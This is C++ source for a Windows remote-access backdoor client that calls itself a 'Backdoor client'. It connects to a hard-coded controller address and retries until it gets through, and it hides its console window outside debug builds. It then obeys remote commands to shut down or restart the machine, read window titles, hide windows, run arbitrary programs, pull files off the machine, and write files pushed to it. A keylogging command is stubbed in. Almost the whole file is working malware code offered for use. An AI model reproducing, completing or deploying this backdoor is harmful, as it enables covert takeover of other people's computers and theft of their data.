//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>

//-- Other header modules.
#include "sEncryption.h"
#include "shadoe32.h"

#include <iostream>
#include <thread>
#include <string>
#include <sstream>
#include <vector>
#include <random>
#include <chrono>

#define _DEBUG_
#define MAX_BUF (1024*64)
#define winsockVersion MAKEWORD(2, 2)
#define socketPort 420
#define ipv4ADDR "192.168.1.10"

char cpuId[48];

using namespace std;


enum sendcode
{
	none, text, file, keylog
};


namespace localFunctions
{

	void __cdecl sendInfoToServer(unsigned int id, char* byteBuffer, int size, sendcode c)
	{
		if (c == none)
		{
			send(id, byteBuffer, size, NULL);
			Sleep(5);
			return;
		};
		char tempBuf[MAX_BUF];
		sEncryption::zeroBuffer(tempBuf, MAX_BUF);

		tempBuf[0] = c;

		memcpy((char*)tempBuf + 1, byteBuffer, size);

		send(id, tempBuf, size + 1, NULL);
		Sleep(5);
		return;
	};

	void  __cdecl outputColor(int colorCode)
	{

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), colorCode);
		return;
	};

	void __cdecl sendFile(unsigned int socket, const char* filePath1, const char* filePath2)
	{

		localFunctions::sendInfoToServer(socket, (char*)filePath2, strlen(filePath2), file);

		std::ifstream inStream(filePath1, std::ios::binary);
		inStream.seekg(0, std::ios::end);

		int fileSize = inStream.tellg();
		inStream.seekg(0, std::ios::beg);

		int endingFileSize = fileSize % MAX_BUF;

		if (endingFileSize == 0)
		{

			endingFileSize = fileSize;
		};

		while (1)
		{
			char* buf = new char[MAX_BUF];
			sEncryption::zeroBuffer(buf, MAX_BUF);

			inStream.read(buf, MAX_BUF);

			if (inStream.eof())
			{

				localFunctions::sendInfoToServer(socket, buf, endingFileSize, none);

				delete[] buf;
				break;
			};

			localFunctions::sendInfoToServer(socket, buf, MAX_BUF, none);
			delete[] buf;
		};

		inStream.close();


		return;
	};
};

char __cdecl connectToServer(unsigned int clientId)
{

	sockaddr_in socketAddress;
	socketAddress.sin_family = AF_INET;
	socketAddress.sin_port = htons(socketPort);
	inet_pton(AF_INET, ipv4ADDR, &socketAddress.sin_addr);

	int connectToServer_STATUS = connect(clientId, (sockaddr*)&socketAddress, sizeof(socketAddress));
	if (connectToServer_STATUS == SOCKET_ERROR)
	{
		std::cout << "Error connecting..." << std::endl;

		return 0;
	};
	return 1;
};



int __cdecl main(void)
{
	info::GetCpuInfo(cpuId);


#ifdef _DEBUG_
	ShowWindow(GetConsoleWindow(), 1);
#else
	ShowWindow(GetConsoleWindow(), 0);
#endif

	while (1)
	{
		WSAData socketDataStructure;
		int socketStartup = (WSAStartup(winsockVersion, &socketDataStructure));
		if (socketStartup != NULL)
		{

			std::cout << "Unable to start up socket!" << std::endl;
			return 0;
		};
		unsigned int clientId = socket(AF_INET, SOCK_STREAM, NULL);
		if (clientId == INVALID_SOCKET)
		{
			std::cout << "Creation of socket failed!" << std::endl;

			return 0;
		};

		while (connectToServer(clientId) == 0)
		{
			Sleep(1000);
		};


		while (1)
		{
			char recvBuffer[MAX_BUF];
			sEncryption::zeroBuffer(recvBuffer, MAX_BUF);

			int recievedBytes = recv(clientId, recvBuffer, MAX_BUF, NULL);
			if (recievedBytes <= 0)
			{

				break;
			};

			std::string commandSent = std::string(recvBuffer, 0, recievedBytes);

			if (commandSent.substr(0, 12) == "closeclient")
			{

				const char* sendMsg = "Backdoor client has been closed";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);

				return 0;
			}
			else if (commandSent.substr(0, 8) == "shutdown")
			{

				const char* sendMsg = "Shutting down client";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);

				std::system("C:\\Windows\\System32\\shutdown /s /t 1");
			}
			else if (commandSent.substr(0, 7) == "restart")
			{

				const char* sendMsg = "Shutting down client";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);

				std::system("C:\\Windows\\System32\\shutdown /r /t 1");
			}
			else if (commandSent.substr(0, 9) == "getwindow")
			{
				char windowBuffer[MAX_BUF];
				sEncryption::zeroBuffer(windowBuffer, MAX_BUF);

				GetWindowTextA(GetForegroundWindow(), windowBuffer, MAX_BUF);

				int windowBufferSize = strlen(windowBuffer);

				localFunctions::sendInfoToServer(clientId, windowBuffer, windowBufferSize + 1, text);
			}
			else if (commandSent.substr(0, 11) == "hidewindow")
			{
				ShowWindow(GetForegroundWindow(), 0);

				const char* sendMsg = "Window hidden";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);
			}
			else if (commandSent.substr(0, 12) == "randommouse")
			{

				RECT desktopScreenDesc;
				HWND desktopWindow = GetDesktopWindow();

				GetWindowRect(desktopWindow, &desktopScreenDesc);


				SetCursorPos(rand() % desktopScreenDesc.right, rand() % desktopScreenDesc.bottom);
			}
			else if (commandSent.substr(0, 6) == "keylog")
			{


			}
			else if (commandSent.substr(0, 12) == "shellexecute")
			{
				char path[260];

				sEncryption::zeroBuffer(path, 260);

				memcpy(path, commandSent.substr(13).c_str(), strlen(commandSent.substr(13).c_str()));


				ShellExecuteA(NULL, NULL, path, NULL, NULL, 5);
			}
			else if (commandSent.substr(0, 7) == "getfile")
			{
				commandSent = commandSent.substr(8);

				char buf[MAX_BUF];
				sEncryption::zeroBuffer(buf, MAX_BUF);
				int total = 0;
				for (int i = 0; i < commandSent.size(); i++)
				{
					if (commandSent[i] == '\x20' || commandSent[i] == '|')
					{
						total++;
						buf[i] = '\x00';
						continue;
					};

					buf[i] = commandSent[i];
				};

				std::string filePath1 = std::string(buf, strlen(buf));
				std::string filePath2 = std::string(buf + strlen(buf) + total, strlen(buf + strlen(buf) + total));


				localFunctions::sendFile(clientId, filePath1.c_str(), filePath2.c_str());
			}
			else if (commandSent.substr(0, 8) == "sendfile")
			{

				std::ofstream outStream(commandSent.substr(9), std::ios::binary);

				while (1)
				{
					char* buf = new char[MAX_BUF];
					sEncryption::zeroBuffer(buf, MAX_BUF);

					int fileByteLength = recv(clientId, buf, MAX_BUF, NULL);

					outStream.write(buf, fileByteLength);

					if (fileByteLength < MAX_BUF)
					{

						delete[] buf;
						break;
					};


					delete[] buf;
				};

				outStream.close();
			}
			else if (commandSent.substr(0, 3) == "cpu")
			{

				localFunctions::sendInfoToServer(clientId, cpuId, strlen(cpuId), text);
			};
		};
		closesocket(clientId);
		WSACleanup();
	};

	std::cin.get();
	return 0;
};

